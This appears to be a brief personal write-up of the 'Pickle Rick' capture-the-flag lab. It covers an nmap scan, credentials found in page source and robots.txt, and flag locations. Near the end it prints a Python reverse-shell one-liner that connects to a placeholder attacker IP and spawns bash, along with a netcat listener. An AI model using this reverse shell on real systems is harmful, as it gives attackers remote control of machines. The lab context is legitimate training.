# Pickle rick

```jsx
┌──(ayachi㉿kali)-[~]
└─$ nmap -sV -Pn 10.67.134.95 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-17 18:08 CET
Nmap scan report for 10.67.134.95
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.04 seconds
```

in the web page i got this when inspect elements 

```jsx
Username: R1ckRul3s
```

this in robots.txt , could be a password or maybe just gibberish 

```jsx
Wubbalubbadubdub
```

i found /login.php

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])’

nc -lvnp 4444

the second flag under /rick

and the third under /root